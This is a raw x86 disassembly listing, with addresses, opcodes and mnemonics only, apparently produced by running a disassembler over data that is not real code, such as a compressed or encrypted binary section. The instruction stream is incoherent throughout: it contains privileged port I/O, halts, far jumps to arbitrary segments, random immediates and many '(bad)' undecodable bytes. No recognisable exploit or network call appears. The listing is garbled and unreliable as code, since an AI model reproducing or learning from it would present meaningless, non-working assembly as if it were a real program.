  425dd6:	adc    al,0x96
  425dd8:	ins    BYTE PTR es:[edi],dx
  425dd9:	rcl    BYTE PTR [ebx+ecx*2+0x26],1
  425ddd:	clc    
  425dde:	mov    edx,0x20e99b9e
  425de3:	stos   DWORD PTR es:[edi],eax
  425de4:	sbb    DWORD PTR [ecx+0x13],0xffffff91
  425de8:	fadd   QWORD PTR [edx-0x12]
  425deb:	and    dh,BYTE PTR [ebx-0x50b9086f]
  425df1:	sar    DWORD PTR [esi+0x56803f2],cl
  425df7:	inc    DWORD PTR [edx+eiz*4+0x1aa6adc7]
  425dfe:	xchg   esp,eax
  425dff:	sbb    al,0xd8
  425e01:	dec    esi
  425e02:	or     bl,0x43
  425e05:	xchg   ebp,eax
  425e06:	xor    eax,ebp
  425e08:	sub    al,0xd7
  425e0a:	mov    eax,0xfbe5bdd8
  425e0f:	or     esi,edi
  425e11:	xchg   ebx,eax
  425e12:	mov    ecx,0x27516239
  425e17:	jno    0x425e2e
  425e19:	loopne 0x425e2f
  425e1b:	push   0x59
  425e1d:	push   ecx
  425e1e:	adc    bl,ah
  425e20:	cmp    bh,BYTE PTR [edx-0x5066d2ef]
  425e26:	pop    ebp
  425e27:	mul    DWORD PTR [edi]
  425e29:	mov    DWORD PTR [ebx-0x3c628691],eax
  425e2f:	adc    edi,DWORD PTR [ebx-0x47679f6d]
  425e35:	push   0x72d347f
  425e3a:	adc    al,0x34
  425e3c:	lds    esp,FWORD PTR [edi-0x4d54b830]
  425e42:	pop    ecx
  425e43:	cld    
  425e44:	jge    0x425de9
  425e46:	loope  0x425e4b
  425e48:	cmp    eax,edi
  425e4a:	sar    DWORD PTR [esp+edi*8+0x5f],1
  425e4e:	add    edi,esi
  425e50:	mov    al,0x16
  425e52:	add    ebp,DWORD PTR [eax]
  425e54:	mov    DWORD PTR [eax-0x2397e363],edi
  425e5a:	mov    al,0x77
  425e5c:	ins    DWORD PTR es:[edi],dx
  425e5d:	push   cs
  425e5e:	push   ebp
  425e5f:	hlt    
  425e60:	mov    ebx,0x1f7bdc91
  425e65:	inc    BYTE PTR [ebx]
  425e67:	push   ebp
  425e68:	cld    
  425e69:	xor    BYTE PTR [edx-0x4a],ah
  425e6c:	add    ch,0x3d
  425e6f:	xor    dl,BYTE PTR [si]
  425e72:	sbb    bl,dh
  425e74:	jno    0x425e61
  425e76:	lods   eax,DWORD PTR ds:[esi]
  425e77:	push   eax
  425e78:	loope  0x425e7a
  425e7a:	cmp    ch,dl
  425e7c:	sbb    ch,dl
  425e7e:	sub    DWORD PTR [ebp-0x1],0x629b2996
  425e85:	mov    cl,0x81
  425e87:	or     cl,BYTE PTR [ecx+0x34]
  425e8a:	jns    0x425ea9
  425e8c:	shl    BYTE PTR ds:[edx+0xf881af],0x53
  425e94:	outs   dx,BYTE PTR ds:[esi]
  425e95:	shl    DWORD PTR [si-0x467c],0xf6
  425e9b:	fmul   st(6),st
  425e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e9e:	sub    esp,DWORD PTR es:[eax-0x5f]
  425ea2:	add    al,0xfd
  425ea4:	in     al,dx
  425ea5:	inc    edx
  425ea6:	into   
  425ea7:	adc    dl,BYTE PTR [edx-0x339ba525]
  425ead:	mov    ecx,0xedeca90c
  425eb2:	inc    ecx
  425eb3:	fild   QWORD PTR [edi]
  425eb5:	or     BYTE PTR [eax+0x1e],ch
  425eb8:	retf   
  425eb9:	jb     0x425ef7
  425ebb:	push   ebx
  425ebc:	in     eax,dx
  425ebd:	fnstcw WORD PTR [ebx]
  425ebf:	sbb    ecx,DWORD PTR [edi+0x0]
	...
  425f31:	add    BYTE PTR [eax],al
  425f33:	add    BYTE PTR [ebx+0x16],cl
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x20]
  425f41:	pushf  
  425f42:	sti    
  425f43:	xor    eax,0x193ba
  425f48:	cmc    
  425f49:	add    BYTE PTR [eax],al
  425f4b:	add    dl,ch
  425f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f4e:	inc    ecx
  425f4f:	hlt    
  425f50:	mov    cl,0x6a
  425f52:	mov    ds:0x5415b926,eax
  425f57:	push   ebp
  425f58:	xchg   ecx,eax
  425f59:	out    dx,eax
  425f5a:	push   0x72
  425f5c:	rcr    esp,1
  425f5e:	pop    esp
  425f5f:	leave  
  425f60:	and    al,0x6c
  425f62:	imul   esi,DWORD PTR [ebx],0x2fc27e1c
  425f68:	test   eax,0xd882880c
  425f6d:	xor    ah,dh
  425f6f:	xlat   BYTE PTR ds:[ebx]
  425f70:	je     0x425f22
  425f72:	rol    BYTE PTR [edx],cl
  425f74:	inc    edi
  425f75:	or     al,0x14
  425f77:	push   esp
  425f78:	pushf  
  425f79:	jo     0x425f7c
  425f7b:	mov    edx,0x158b86e4
  425f80:	jp     0x425fad
  425f82:	and    al,0xa3
  425f84:	mov    dl,0xf0
  425f86:	fwait
  425f87:	dec    DWORD PTR ds:0xe0df26de
  425f8d:	jo     0x425fed
  425f8f:	jl     0x42600b
  425f91:	adc    eax,0xcfd8e97c
  425f96:	adc    eax,0xb52f0aa9
  425f9b:	inc    eax
  425f9c:	test   eax,0x8734bad3
  425fa1:	add    ebp,DWORD PTR es:[esi+0x46]
  425fa5:	mov    dh,0x80
  425fa7:	dec    esp
  425fa8:	aam    0xae
  425faa:	mov    cs,WORD PTR [eax]
  425fac:	not    BYTE PTR [eax]
  425fae:	mov    ds:0x577e9ef6,eax
  425fb3:	es das 
  425fb5:	int3   
  425fb6:	cmp    al,0x92
  425fb8:	inc    ebx
  425fb9:	jp     0x425f4b
  425fbb:	and    esi,DWORD PTR [eax+0x59]
  425fbe:	lods   eax,DWORD PTR ds:[esi]
  425fbf:	or     al,0x5a
  425fc1:	xchg   BYTE PTR [ecx+0x73a327a2],ah
  425fc7:	imul   edx,ecx,0x9a987104
  425fcd:	fadd   DWORD PTR [edi+0x2d]
  425fd0:	xchg   BYTE PTR [edi-0x67],bl
  425fd3:	sbb    eax,0xfa461ca6
  425fd8:	mov    cl,0x5e
  425fda:	mov    al,0x80
  425fdc:	mov    dl,0x77
  425fde:	xchg   edx,eax
  425fdf:	fiadd  WORD PTR [esi]
  425fe1:	pop    ebp
  425fe2:	out    0xd2,eax
  425fe4:	fnstenv [esp+eiz*4]
  425fe7:	scas   eax,DWORD PTR es:[edi]
  425fe8:	dec    edx
  425fe9:	arpl   WORD PTR [edx-0x188281f6],sp
  425fef:	bound  eax,QWORD PTR [edx-0x66554fa2]
  425ff5:	aaa    
  425ff6:	mov    al,0x65
  425ff8:	aaa    
  425ff9:	xor    ah,dl
  425ffb:	std    
  425ffc:	sub    al,0x3d
  425ffe:	fwait
  425fff:	pop    edi
  426000:	stos   DWORD PTR es:[edi],eax
  426001:	fwait
  426002:	and    cl,0xaf
  426005:	fiadd  WORD PTR [ebp+0x7c]
  426008:	(bad)  
  426009:	jecxz  0x426004
  42600b:	sar    DWORD PTR [edi],cl
  42600d:	mov    cl,0x40
  42600f:	hlt    
  426010:	push   ecx
  426011:	imul   esi,esi,0x42
  426014:	mov    esp,0xd1ab40df
  426019:	call   0x5be1:0x97af0471
  426020:	and    esp,DWORD PTR [ebx+0x28c0e57f]
  426026:	or     DWORD PTR [edx+eiz*1],ecx
  426029:	add    eax,0x5dbad752
  42602e:	mov    dh,0x8
  426030:	sub    BYTE PTR [edx+0x27],bl
  426033:	out    0x14,al
  426035:	mov    ds:0x37af78cf,eax
  42603a:	fs inc esi
  42603c:	bound  edi,QWORD PTR [ecx-0xb]
  42603f:	jno    0x4260b7
	...
  4260b1:	add    BYTE PTR [eax],al
  4260b3:	add    dh,bl
  4260b5:	adc    DWORD PTR [edi-0x15020dd],ebx
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x11ad9dcf
  4260c4:	scas   eax,DWORD PTR es:[edi]
  4260c5:	xchg   esp,eax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	cmc    
  4260c9:	add    BYTE PTR [eax],al
  4260cb:	add    BYTE PTR [edi],ah
  4260cd:	sub    DWORD PTR [ecx-0x44dc4f32],ebp
  4260d3:	cmp    al,0x57
  4260d5:	out    dx,al
  4260d6:	mov    esi,0x29e90471
  4260db:	arpl   bp,ax
  4260dd:	push   esi
  4260de:	imul   esp,ecx,0xffffffdf
  4260e1:	and    ebp,DWORD PTR [esi+0x1feabb7f]
  4260e7:	sbb    BYTE PTR [edi-0x16],dh
  4260ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4260eb:	in     al,0x5
  4260ed:	int3   
  4260ee:	or     BYTE PTR [ecx-0x620bde28],ah
  4260f4:	fisttp WORD PTR [edi]
  4260f6:	popf   
  4260f7:	sti    
  4260f8:	pop    eax
  4260f9:	pop    edi
  4260fa:	push   ecx
  4260fb:	pop    ss
  4260fc:	outs   dx,DWORD PTR ds:[esi]
  4260fd:	and    eax,0x1fe3d52a
  426102:	(bad)  
  426103:	pop    esp
  426104:	(bad)
  426108:	mov    ds:0xd89a5a74,eax
  42610d:	test   al,0x4f
  426110:	int3   
  426111:	sub    BYTE PTR [eax-0x77],bl
  426114:	xchg   edi,eax
  426115:	(bad)  
  426116:	lea    ecx,[esi-0x75]
  426119:	adc    edi,DWORD PTR [ebp+0x4]
  42611c:	push   ecx
  42611d:	jno    0x4260e7
  42611f:	jmp    0x9b3c:0xaa397175
  426126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426127:	push   ds
  426128:	xchg   esp,eax
  426129:	cwde   
  42612a:	pushf  
  42612b:	repz xchg ebp,eax
  42612d:	dec    ebx
  42612e:	xchg   edi,eax
  42612f:	cld    
  426130:	test   al,0x94
  426133:	push   ss
  426134:	div    BYTE PTR [ebx+0x4b]
  426137:	push   0xffffffd3
  426139:	stos   DWORD PTR es:[edi],eax
  42613a:	or     dl,BYTE PTR [eax-0x2c04d69]
  426140:	sbb    al,0x65
  426142:	rcl    BYTE PTR [edx-0x682bbdb8],cl
  426148:	ins    DWORD PTR es:[edi],dx
  426149:	xchg   edx,eax
  42614a:	ds pop edi
  42614c:	in     al,0x55
  42614e:	iret   
  42614f:	add    eax,0xbd7bf90c
  426154:	call   0x1754a236
  426159:	sbb    DWORD PTR [ebp+esi*1+0x67],esi
  42615d:	out    0x29,al
  42615f:	push   eax
  426160:	pop    ds
  426161:	into   
  426162:	lods   eax,DWORD PTR ds:[esi]
  426163:	sbb    DWORD PTR ds:0x56f9434d,ebp
  426169:	cmp    al,dh
  42616b:	cli    
  42616c:	ins    DWORD PTR es:[edi],dx
  42616d:	push   edx
  42616e:	cmp    eax,ebx
  426170:	sti    
  426171:	retf   0x11a3
  426174:	mov    esi,0x80432910
  426179:	xchg   esi,eax
  42617a:	popf   
  42617b:	adc    BYTE PTR [ebx],dl
  42617d:	repz mov cl,0xa0
  426180:	xor    edx,edi
  426182:	xchg   esi,eax
  426183:	test   eax,0x497986ba
  426189:	xchg   ecx,eax
  42618a:	retf   
  42618b:	test   DWORD PTR [eax-0x73],0xd3cc685e
  426192:	std    
  426193:	es scas eax,DWORD PTR es:[edi]
  426195:	fcom   DWORD PTR [ebp+0x42be0dd0]
  42619b:	sbb    eax,0x4f023a31
  4261a0:	and    eax,0xc1cd197a
  4261a5:	inc    ebx
  4261a6:	push   ebx
  4261a7:	loopne 0x42619d
  4261a9:	sbb    DWORD PTR [eax-0x42fe8a3d],eax
  4261af:	and    bh,dh
  4261b1:	push   es
  4261b2:	xchg   edx,eax
  4261b3:	mov    ds:0x3f836d07,eax
  4261b8:	and    DWORD PTR [ecx+0x7388137d],0x16
  4261bf:	retf   
  4261c0:	popa   
	...
  426231:	add    BYTE PTR [eax],al
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0x4f
  426241:	inc    ebp
  426242:	add    al,0x7f
  426244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426245:	xchg   ebp,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	cmc    
  426249:	add    BYTE PTR [eax],al
  42624b:	add    BYTE PTR [ebx-0x5eab92d5],ch
  426251:	xor    DWORD PTR [ebx-0x33eec2cb],ecx
  426257:	xor    BYTE PTR [ebp+0x26759967],dl
  42625d:	mov    ebp,0xcc439912
  426262:	inc    esi
  426263:	xchg   ebp,eax
  426264:	ds xchg ebx,eax
  426266:	mov    ebx,0xd7f685c1
  42626b:	popa   
  42626c:	fldlg2 
  42626e:	outs   dx,BYTE PTR ds:[esi]
  42626f:	sahf   
  426270:	bound  edx,QWORD PTR [ebp+edi*8+0x5e]
  426274:	rcr    DWORD PTR [ecx-0x23],1
  426277:	jo     0x426216
  426279:	popf   
  42627a:	stos   DWORD PTR es:[edi],eax
  42627b:	pop    edi
  42627c:	mov    esp,0xf129a90d
  426281:	test   eax,0x1005de08
  426286:	add    eax,0x82da3792
  42628b:	mov    ecx,DWORD PTR [ebx+0x46]
  42628e:	xor    eax,0x6138113
  426293:	arpl   cx,bx
  426295:	and    DWORD PTR [esp+esi*4-0x837cc31],ebx
  42629c:	pushf  
  42629d:	xchg   DWORD PTR [edx+0x48],edx
  4262a0:	sar    ebx,cl
  4262a2:	mov    ebx,0x96ef1f02
  4262a7:	retf   0x742b
  4262aa:	imul   ecx,DWORD PTR [ebx+eiz*2-0x2f8a2216],0x75
  4262b2:	aam    0x2a
  4262b4:	pop    ecx
  4262b5:	and    al,0x70
  4262b7:	aaa    
  4262b8:	pop    ss
  4262b9:	in     al,dx
  4262ba:	ror    DWORD PTR [ebp+0x64ef497e],0x5f
  4262c1:	lahf   
  4262c2:	inc    esi
  4262c3:	mov    BYTE PTR [ecx+0x2d],dh
  4262c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262c7:	(bad)  
  4262c9:	rcl    ecx,cl
  4262cb:	hlt    
  4262cc:	and    esp,ecx
  4262ce:	jne    0x426268
  4262d0:	pop    ebp
  4262d1:	jo     0x4262a7
  4262d3:	adc    ah,bl
  4262d5:	(bad)  
  4262d6:	fsubr  DWORD PTR [eax+0x71]
  4262d9:	shl    BYTE PTR [edx],cl
  4262db:	jecxz  0x42634e
  4262dd:	mov    esp,DWORD PTR [edi-0x1aae8658]
  4262e3:	imul   esi,DWORD PTR [eax-0x17],0x9c0cc988
  4262ea:	jo     0x42626c
  4262ec:	mov    ds:0xc454d505,eax
  4262f1:	sub    al,BYTE PTR [ecx-0x7c]
  4262f4:	je     0x4262e3
  4262f6:	stos   BYTE PTR es:[edi],al
  4262f7:	loope  0x42630e
  4262f9:	add    cl,BYTE PTR [ecx-0x51]
  4262fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262fd:	sbb    ecx,DWORD PTR [edx+0xd]
  426300:	sbb    ecx,esi
  426302:	cmp    ch,BYTE PTR [eax+0x21]
  426305:	mov    al,ds:0x94955e99
  42630a:	mov    bl,0x3d
  42630c:	outs   dx,BYTE PTR ds:[esi]
  42630d:	int    0x55
  42630f:	mov    ds:0x8fecc934,eax
  426314:	pop    ebx
  426315:	cs dec edx
  426317:	adc    DWORD PTR [esi-0x30],eax
  42631a:	mov    ah,0x81
  42631c:	iret   
  42631d:	cs test ah,ah
  426320:	out    0x52,al
  426322:	outs   dx,BYTE PTR ds:[esi]
  426324:	push   ds
  426325:	(bad)  
  426326:	fsubr  st(7),st
  426328:	sahf   
  426329:	pop    ebx
  42632a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42632c:	and    eax,0x1044bd55
  426331:	aad    0x6
  426333:	xchg   edx,eax
  426334:	ins    BYTE PTR es:[edi],dx
  426335:	mov    BYTE PTR [esi-0x3d],0x89
  426339:	adc    eax,0xa67b7ca9
  42633e:	lahf   
  42633f:	mov    ah,0xed
	...
  4263b1:	add    BYTE PTR [eax],al
  4263b3:	add    BYTE PTR [edx+0x9],al
  4263b6:	les    ebp,FWORD PTR [ecx-0x14901231]
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	ins    BYTE PTR es:[edi],dx
  4263c1:	out    0x5c,al
  4263c3:	adc    DWORD PTR [ecx-0xafffe6a],ebx
  4263c9:	add    BYTE PTR [eax],al
  4263cb:	add    ah,dh
  4263cd:	pinsrw mm6,WORD PTR [ecx-0x7704095],0x99
  4263d5:	out    dx,eax
  4263d6:	imul   esp,DWORD PTR ss:[ecx],0xe88e4169
  4263dd:	push   edi
  4263de:	out    dx,al
  4263df:	and    ah,0xfa
  4263e2:	add    al,0xf3
  4263e4:	fisttp QWORD PTR [ebx]
  4263e6:	xor    DWORD PTR [edi+0x3a],edi
  4263e9:	inc    ecx
  4263ea:	dec    edi
  4263eb:	add    ecx,DWORD PTR [ebx-0xf]
  4263ee:	xlat   BYTE PTR ds:[ebx]
  4263ef:	test   al,0x63
  4263f1:	jle    0x42641b
  4263f3:	mov    eax,ds:0xc74fa2a1
  4263f8:	adc    al,0x7b
  4263fa:	or     eax,esp
  4263fc:	fcom   DWORD PTR [ecx]
  4263fe:	ja     0x4263dd
  426400:	loopne 0x426418
  426402:	mov    ds:0xf0ce9583,al
  426407:	push   eax
  426408:	into   
  426409:	xchg   ecx,edi
  42640b:	shl    dl,0x9f
  42640e:	pop    ebx
  42640f:	push   ebx
  426410:	cmp    eax,0xc9121236
  426415:	sahf   
  426416:	sbb    eax,DWORD PTR ds:0xa1898cb9
  42641c:	pop    esi
  42641d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42641e:	inc    edi
  42641f:	fcomp  QWORD PTR [esi-0x65fa3816]
  426425:	pop    esp
  426426:	jmp    0x2199f50a
  42642b:	aad    0xdd
  42642d:	ss mov dh,0xd3
  426430:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426431:	dec    edi
  426432:	bound  ebp,QWORD PTR [edi+0x26]
  426435:	inc    ebx
  426436:	daa    
  426437:	mov    bl,0x7
  426439:	addr16 rol ah,cl
  42643c:	jmp    0xdc358038
  426441:	iret   
  426442:	adc    esi,DWORD PTR [eax+ebp*4+0xe]
  426446:	jg     0x42643d
  426448:	or     eax,0x84c87aab
  42644d:	push   edi
  42644e:	mov    edi,0xef4ae2c6
  426453:	in     al,0xb4
  426455:	push   edx
  426456:	mov    edi,0xc4a70c7a
  42645b:	jbe    0x42647d
  42645d:	into   
  42645e:	pop    esp
  42645f:	sahf   
  426460:	mov    WORD PTR [eax+0x744a3c10],gs
  426466:	and    al,0xcb
  426468:	std    
  426469:	in     eax,dx
  42646a:	push   es
  42646b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42646c:	sub    DWORD PTR [esi-0x5f],ebp
  42646f:	jo     0x426404
  426471:	sbb    BYTE PTR [ebx+0x4],0xe0
  426475:	pop    es
  426476:	mov    ebp,0x1f1cf324
  42647b:	cwde   
  42647c:	outs   dx,BYTE PTR ds:[esi]
  42647d:	scas   al,BYTE PTR es:[edi]
  42647e:	sbb    DWORD PTR [edi-0x3885ffcc],ebx
  426484:	js     0x42646a
  426486:	je     0x426472
  426488:	test   DWORD PTR [edx-0x1899ae9f],edi
  42648e:	add    DWORD PTR ds:0xf5245d09,eax
  426494:	push   edi
  426495:	adc    bl,cl
  426497:	xchg   edi,eax
  426498:	out    0x96,eax
  42649a:	add    cl,ch
  42649c:	rcr    ebx,cl
  42649e:	xchg   ecx,eax
  42649f:	imul   edi,DWORD PTR [esi-0x4c],0xece0edf6
  4264a6:	add    cl,BYTE PTR ds:0xa482b5c2
  4264ac:	into   
  4264ad:	jns    0x426447
  4264af:	cmp    edi,DWORD PTR [eax+0x1e8efb9b]
  4264b5:	popa   
  4264b6:	scas   al,BYTE PTR es:[edi]
  4264b7:	adc    BYTE PTR [ecx+0x10e1186b],0x1e
  4264be:	mov    cl,0xaa
  4264c0:	jb     0x4264c2
	...
  426532:	add    BYTE PTR [eax],al
  426534:	(bad)  
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	adc    al,0xc3
  426542:	scas   al,BYTE PTR es:[edi]
  426543:	outs   dx,BYTE PTR ds:[esi]
  426544:	mov    ss,WORD PTR [edi+0xf50001]
  42654a:	add    BYTE PTR [eax],al
  42654c:	inc    eax
  42654d:	push   ebp
  42654e:	rcl    BYTE PTR [ecx+edi*2+0x2f],1
  426552:	stc    
  426553:	inc    ebx
  426554:	mov    cl,0x4b
  426556:	dec    edi
  426557:	sti    
  426558:	pop    ss
  426559:	rol    ebp,1
  42655b:	aam    0x24
  42655d:	xchg   BYTE PTR [esi-0x50],bh
  426560:	mov    dl,dl
  426562:	dec    BYTE PTR [ecx]
  426564:	add    eax,0x1c2094e6
  426569:	test   al,0xf3
  42656b:	mov    BYTE PTR [edi+edi*1-0x2b],ah
  42656f:	int    0x94
  426571:	test   eax,0xe2a616b2
  426576:	mov    al,0x43
  426578:	bound  esi,QWORD PTR [edi-0x362ee0c5]
  42657e:	arpl   dx,sp
  426580:	and    bh,0x8c
  426583:	sub    eax,0x5fba8608
  426588:	pop    esp
  426589:	and    al,0x41
  42658b:	adc    ebx,ebx
  42658d:	sbb    DWORD PTR [ecx+0x57],esi
  426590:	push   ds
  426591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426592:	int3   
  426593:	inc    esi
  426594:	mov    ch,0x96
  426596:	arpl   WORD PTR [esi],sp
  426598:	xchg   edx,eax
  426599:	jo     0x4265b0
  42659b:	dec    ecx
  42659c:	mov    DWORD PTR [ebx+edi*4-0x76],0xf67cb041
  4265a4:	push   ecx
  4265a5:	fild   DWORD PTR [edi-0x6e]
  4265a8:	and    ah,BYTE PTR [edi+ecx*2-0x7d]
  4265ac:	sub    bl,ch
  4265ae:	mov    ch,0x5f
  4265b0:	pop    ds
  4265b1:	mov    edi,0x74b975fd
  4265b6:	sub    DWORD PTR [esi-0x38],esp
  4265b9:	jnp    0x426638
  4265bb:	sbb    eax,0x9f4937a1
  4265c0:	jecxz  0x426587
  4265c2:	fs aaa 
  4265c4:	bound  ecx,QWORD PTR [edx+0x3da2ee53]
  4265ca:	sbb    DWORD PTR [ebx+0x4614c525],edx
  4265d0:	dec    edx
  4265d1:	fmul   st(2),st
  4265d3:	outs   dx,BYTE PTR ds:[esi]
  4265d4:	sbb    eax,0x26584b75
  4265d9:	push   ecx
  4265da:	rcr    BYTE PTR [ebx+0xea8f52a],0x38
  4265e1:	push   es
  4265e2:	lods   eax,DWORD PTR ds:[esi]
  4265e3:	xor    DWORD PTR [ecx+ecx*4],edi
  4265e6:	into   
  4265e7:	cmp    ebp,esi
  4265e9:	mov    WORD PTR [esi+ebp*1],cs
  4265ec:	or     BYTE PTR [edx+0x7e6c92cf],bl
  4265f2:	stos   BYTE PTR es:[edi],al
  4265f3:	loop   0x426616
  4265f5:	loop   0x426619
  4265f7:	sub    edi,edi
  4265f9:	adc    eax,0x3e92e562
  4265fe:	shl    DWORD PTR [edi-0x6b],cl
  426601:	stc    
  426602:	sub    al,BYTE PTR [edi]
  426604:	and    ah,BYTE PTR [eax+eiz*2-0x21]
  426608:	outs   dx,BYTE PTR ds:[esi]
  426609:	dec    ebx
  42660a:	add    ah,ch
  42660c:	dec    edi
  42660d:	cmp    cl,dh
  42660f:	pop    esp
  426611:	test   eax,0x179d88f
  426616:	iret   
  426617:	lds    esp,FWORD PTR [ecx+0x72db77c0]
  42661d:	repnz aaa 
  42661f:	xor    BYTE PTR [edi+esi*2-0x5b],dh
  426623:	mov    DWORD PTR [eax+eax*2-0x7],ebx
  426627:	jmp    0x4265bb
  426629:	jae    0x426670
  42662b:	cld    
  42662c:	addr16 in al,dx
  42662e:	(bad)  
  426630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426631:	push   esp
  426632:	das    
  426633:	div    DWORD PTR [esi-0x5c]
  426636:	mov    DWORD PTR [edx],ecx
  426638:	jg     0x426601
  42663a:	ins    DWORD PTR es:[edi],dx
  42663b:	mov    ds:0x723f958d,eax
  426640:	jb     0x426642
	...
  4266b2:	add    BYTE PTR [eax],al
  4266b4:	(bad)  
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	lock clc 
  4266c2:	xor    eax,DWORD PTR [esi-0x7d]
  4266c5:	cwde   
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	cmc    
  4266c9:	add    BYTE PTR [eax],al
  4266cb:	add    dh,al
  4266cd:	stos   BYTE PTR es:[edi],al
  4266ce:	mov    edi,0x9ba1e292
  4266d3:	sub    al,0xcc
  4266d5:	mov    DWORD PTR es:[edx],ebp
  4266d8:	stc    
  4266d9:	adc    esp,ecx
  4266db:	adc    bh,BYTE PTR [ecx-0x5ca490a8]
  4266e1:	inc    edi
  4266e2:	loope  0x42667b
  4266e4:	cdq    
  4266e5:	xlat   BYTE PTR ds:[ebx]
  4266e6:	pop    ss
  4266e7:	sbb    DWORD PTR [ebp+0x6a],esi
  4266ea:	pop    esi
  4266eb:	mov    cl,0x20
  4266ed:	(bad)  
  4266ee:	pop    DWORD PTR ss:[ecx]
  4266f1:	mov    fs,WORD PTR ss:[edi-0x63]
  4266f5:	fwait
  4266f6:	outs   dx,BYTE PTR ds:[esi]
  4266f7:	adc    al,0x9a
  4266f9:	adc    al,0x1c
  4266fb:	dec    ecx
  4266fc:	sbb    al,0x5e
  4266fe:	(bad)  
  426700:	popa   
  426701:	inc    edi
  426702:	scas   eax,DWORD PTR es:[edi]
  426703:	ret    
  426704:	push   ecx
  426705:	add    DWORD PTR [ebp+0x60dad82d],ecx
  42670b:	fstp   st(2)
  42670d:	test   al,0x51
  42670f:	sub    dl,BYTE PTR [edi+ecx*4-0x4a8333ff]
  426716:	test   DWORD PTR [ebx+edx*1-0x20],edi
  42671a:	push   es
  42671b:	jbe    0x426787
  42671d:	mov    ebp,0xe9fb1d7f
  426722:	cmp    eax,DWORD PTR [edi*2+0x3c5fc326]
  426729:	mov    ss,WORD PTR [ebp+0x1f24506e]
  42672f:	lahf   
  426730:	ds mov esi,0xcde5e9d2
  426736:	jno    0x42673f
  426738:	sbb    DWORD PTR [ecx+eiz*1-0x41],edx
  42673c:	std    
  42673d:	arpl   cx,dx
  42673f:	call   FWORD PTR [edx]
  426741:	icebp  
  426742:	cwde   
  426743:	rcl    DWORD PTR [eax],cl
  426745:	fwait
  426746:	dec    eax
  426747:	pushf  
  426748:	push   esp
  426749:	les    esp,FWORD PTR [ebx-0x4a]
  42674c:	jo     0x4266da
  42674e:	out    dx,eax
  42674f:	cli    
  426750:	lds    eax,FWORD PTR [edx]
  426752:	sbb    ah,BYTE PTR [edx+edx*8]
  426755:	stc    
  426756:	push   ebp
  426757:	frstor [esi]
  426759:	inc    edi
  42675a:	push   ds
  42675b:	add    dl,ch
  42675d:	lock dec edi
  42675f:	inc    edx
  426760:	mov    al,0x39
  426762:	push   ds
  426763:	jecxz  0x426775
  426765:	data16 or dh,bh
  426768:	iret   
  426769:	cdq    
  42676a:	scas   eax,DWORD PTR es:[edi]
  42676b:	dec    edi
  42676c:	iret   
  42676d:	or     ebx,DWORD PTR [ebx-0x2a892d93]
  426773:	daa    
  426774:	loop   0x4267b0
  426776:	(bad)  
  426777:	leave  
  426778:	jno    0x426783
  42677a:	cmp    ebx,DWORD PTR [eax]
  42677c:	ds mov ah,0xfc
  42677f:	out    0x56,eax
  426781:	nop
  426782:	adc    eax,0x84ef5a9d
  426787:	outs   dx,DWORD PTR ds:[esi]
  426788:	dec    edx
  426789:	repnz pop esi
  42678b:	mov    edi,ecx
  42678d:	(bad)  [esp+edx*8]
  426790:	out    dx,al
  426791:	or     DWORD PTR cs:[esi+eax*1+0x2b],edx
  426796:	push   edx
  426797:	ds pusha 
  426799:	cmp    al,0x8d
  42679b:	mov    dh,0x2a
  42679d:	xchg   edi,eax
  42679e:	pop    ecx
  42679f:	mov    ecx,0x3d145362
  4267a4:	push   cs
  4267a5:	push   edx
  4267a6:	iret   
  4267a7:	adc    eax,0xf4b42e7d
  4267ac:	cs cld 
  4267ae:	enter  0x6dad,0x99
  4267b2:	mov    ebp,0xa1e745df
  4267b7:	sbb    cl,0xad
  4267ba:	sub    DWORD PTR [edx+0x7327c837],esi
  4267c0:	add    BYTE PTR ss:[eax],al
	...
  426833:	add    BYTE PTR [edx+edx*2-0x70],bl
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x1cf9a934],cl
  426843:	loope  0x4268bd
  426845:	cdq    
  426846:	add    DWORD PTR [eax],eax
  426848:	cmc    
  426849:	add    BYTE PTR [eax],al
  42684b:	add    BYTE PTR [ecx],bl
  42684d:	add    esi,DWORD PTR [eax-0x14e812d2]
  426853:	ins    DWORD PTR es:[edi],dx
  426854:	mov    esi,0x19464c41
  426859:	mov    cl,0x8f
  42685b:	stc    
  42685c:	aad    0x55
  42685e:	inc    eax
  42685f:	loopne 0x4267f4
  426861:	xchg   BYTE PTR [esi],ch
  426863:	push   edx
  426864:	inc    eax
  426865:	retf   0x8c57
  426868:	sub    DWORD PTR [ebx-0x6a],esp
  42686b:	ret    
  42686c:	and    edi,DWORD PTR [eax]
  42686e:	mov    eax,ds:0xa30d1b18
  426873:	pop    ecx
  426874:	and    ah,BYTE PTR [edi]
  426876:	sbb    DWORD PTR cs:[edx],eax
